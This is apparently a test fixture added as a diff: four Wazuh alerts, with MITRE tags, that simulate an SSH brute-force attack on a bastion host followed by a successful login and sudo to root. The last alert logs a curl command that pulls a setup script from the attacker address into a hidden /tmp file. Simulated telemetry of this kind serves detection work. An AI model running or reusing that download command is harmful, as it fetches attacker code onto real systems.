@@ -1,0 +1,191 @@
+[
+  {
+    "id": "wazuh-ssh-bruteforce-001",
+    "source": "wazuh",
+    "timestamp": "2026-07-17T22:03:11Z",
+    "payload": {
+      "id": "wazuh-ssh-bruteforce-001",
+      "timestamp": "2026-07-17T22:03:11Z",
+      "agent": {
+        "id": "007",
+        "name": "dmz-bastion-07",
+        "ip": "10.0.9.7",
+        "os": {
+          "name": "Ubuntu 22.04.4 LTS"
+        }
+      },
+      "manager": {
+        "name": "wazuh-manager-01"
+      },
+      "rule": {
+        "id": "5712",
+        "level": 10,
+        "description": "sshd: brute force trying to get access to the system. Non existent user.",
+        "groups": [
+          "syslog",
+          "sshd",
+          "authentication_failures"
+        ],
+        "frequency": 214,
+        "mitre": {
+          "id": [
+            "T1110"
+          ],
+          "tactic": [
+            "Credential Access"
+          ],
+          "technique": [
+            "Brute Force"
+          ]
+        }
+      },
+      "data": {
+        "srcip": "8.8.8.8",
+        "srcport": "44112",
+        "srcuser": "root",
+        "dstuser": "root"
+      },
+      "full_log": "sshd[20114]: Failed password for invalid user root from 8.8.8.8 port 44112 ssh2 (214 failures in 90 seconds)"
+    }
+  },
+  {
+    "id": "wazuh-ssh-bruteforce-002",
+    "source": "wazuh",
+    "timestamp": "2026-07-17T22:04:26Z",
+    "payload": {
+      "id": "wazuh-ssh-bruteforce-002",
+      "timestamp": "2026-07-17T22:04:26Z",
+      "agent": {
+        "id": "007",
+        "name": "dmz-bastion-07",
+        "ip": "10.0.9.7",
+        "os": {
+          "name": "Ubuntu 22.04.4 LTS"
+        }
+      },
+      "rule": {
+        "id": "5720",
+        "level": 10,
+        "description": "sshd: Multiple authentication failures followed by continued attempts.",
+        "groups": [
+          "syslog",
+          "sshd",
+          "authentication_failures"
+        ],
+        "frequency": 96,
+        "mitre": {
+          "id": [
+            "T1110"
+          ],
+          "tactic": [
+            "Credential Access"
+          ],
+          "technique": [
+            "Brute Force"
+          ]
+        }
+      },
+      "data": {
+        "srcip": "8.8.8.8",
+        "srcport": "44730",
+        "srcuser": "deploy",
+        "dstuser": "deploy"
+      },
+      "full_log": "sshd[20388]: Failed password for deploy from 8.8.8.8 port 44730 ssh2 (96 further failures)"
+    }
+  },
+  {
+    "id": "wazuh-ssh-success-003",
+    "source": "wazuh",
+    "timestamp": "2026-07-17T22:04:58Z",
+    "payload": {
+      "id": "wazuh-ssh-success-003",
+      "timestamp": "2026-07-17T22:04:58Z",
+      "agent": {
+        "id": "007",
+        "name": "dmz-bastion-07",
+        "ip": "10.0.9.7",
+        "os": {
+          "name": "Ubuntu 22.04.4 LTS"
+        }
+      },
+      "rule": {
+        "id": "5715",
+        "level": 10,
+        "description": "sshd: authentication success immediately following a brute force burst from the same source",
+        "groups": [
+          "syslog",
+          "sshd",
+          "authentication_success",
+          "authentication_failures"
+        ],
+        "mitre": {
+          "id": [
+            "T1110",
+            "T1078"
+          ],
+          "tactic": [
+            "Credential Access",
+            "Defense Evasion"
+          ],
+          "technique": [
+            "Brute Force",
+            "Valid Accounts"
+          ]
+        }
+      },
+      "data": {
+        "srcip": "8.8.8.8",
+        "srcport": "44902",
+        "srcuser": "deploy",
+        "dstuser": "deploy"
+      },
+      "full_log": "sshd[20441]: Accepted password for deploy from 8.8.8.8 port 44902 ssh2"
+    }
+  },
+  {
+    "id": "wazuh-ssh-postauth-sudo-004",
+    "source": "wazuh",
+    "timestamp": "2026-07-17T22:05:31Z",
+    "payload": {
+      "id": "wazuh-ssh-postauth-sudo-004",
+      "timestamp": "2026-07-17T22:05:31Z",
+      "agent": {
+        "id": "007",
+        "name": "dmz-bastion-07",
+        "ip": "10.0.9.7",
+        "os": {
+          "name": "Ubuntu 22.04.4 LTS"
+        }
+      },
+      "rule": {
+        "id": "5402",
+        "level": 9,
+        "description": "Successful sudo to ROOT executed shortly after a remote password authentication",
+        "groups": [
+          "syslog",
+          "sudo",
+          "privilege_escalation"
+        ],
+        "mitre": {
+          "id": [
+            "T1548.003"
+          ],
+          "tactic": [
+            "Privilege Escalation"
+          ],
+          "technique": [
+            "Sudo and Sudo Caching"
+          ]
+        }
+      },
+      "data": {
+        "srcip": "8.8.8.8",
+        "srcuser": "deploy",
+        "dstuser": "root",
+        "command": "/usr/bin/curl -fsSL http://8.8.8.8/i/setup.sh -o /tmp/.s"
+      },
+      "full_log": "sudo: deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/curl -fsSL http://8.8.8.8/i/setup.sh -o /tmp/.s"
+    }
+  }
+]
